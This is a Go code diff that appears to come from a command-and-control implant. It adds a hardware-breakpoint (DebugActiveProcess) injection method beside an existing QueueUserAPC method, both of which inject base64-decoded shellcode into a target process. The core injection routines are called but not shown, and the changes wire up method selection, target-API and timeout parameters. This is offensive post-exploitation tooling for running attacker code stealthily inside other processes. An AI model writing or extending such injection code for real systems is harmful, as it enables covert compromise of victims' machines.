@@ -53,6 +53,15 @@ type ApcInjectionParams struct {
 	PID          int    `json:"pid"`
 	TID          int    `json:"tid"`
 	Target       string `json:"target"` // "auto", "auto-elevated", "auto-user"
+	// Method selects the injection technique:
+	//   "" or "apc" — QueueUserAPC into an alertable thread (default; requires TID).
+	//   "hwbp"      — Hardware-breakpoint redirect via DebugActiveProcess (no TID needed).
+	Method string `json:"method"`
+	// TargetAPI is only consulted when Method == "hwbp". Format "module!function".
+	// Default "ntdll!NtDelayExecution".
+	TargetAPI string `json:"target_api"`
+	// TimeoutMs caps the HWBP debug-event loop. Default 30000.
+	TimeoutMs uint32 `json:"timeout_ms"`
 }
 
 func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
@@ -87,8 +96,10 @@ func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 	if params.PID <= 0 {
 		return errorResult("Error: Invalid PID specified")
 	}
-	if params.TID <= 0 {
-		return errorResult("Error: Invalid Thread ID specified")
+
+	method := strings.ToLower(strings.TrimSpace(params.Method))
+	if method == "" {
+		method = "apc"
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
@@ -99,11 +110,31 @@ func (c *ApcInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorResult("Error: Shellcode data is empty")
 	}
 
-	output, err := performApcInjection(shellcode, params.PID, params.TID)
-	if err != nil {
-		return errorResult(output + fmt.Sprintf("\n[!] Injection failed: %v", err))
+	switch method {
+	case "apc":
+		if params.TID <= 0 {
+			return errorResult("Error: Invalid Thread ID specified (APC method requires -tid)")
+		}
+		output, err := performApcInjection(shellcode, params.PID, params.TID)
+		if err != nil {
+			return errorResult(output + fmt.Sprintf("\n[!] Injection failed: %v", err))
+		}
+		return successResult(output)
+	case "hwbp":
+		hwbpParams := HwbpInjectionParams{
+			Shellcode: shellcode,
+			PID:       uint32(params.PID),
+			TargetAPI: params.TargetAPI,
+			TimeoutMs: params.TimeoutMs,
+		}
+		output, err := hwbpInjectShellcode(hwbpParams)
+		if err != nil {
+			return errorResult(output + fmt.Sprintf("\n[!] HWBP injection failed: %v", err))
+		}
+		return successResult(output)
+	default:
+		return errorf("Error: unknown method %q (expected \"apc\" or \"hwbp\")", method)
 	}
-	return successResult(output)
 }
 
 func performApcInjection(shellcode []byte, pid int, tid int) (string, error) {
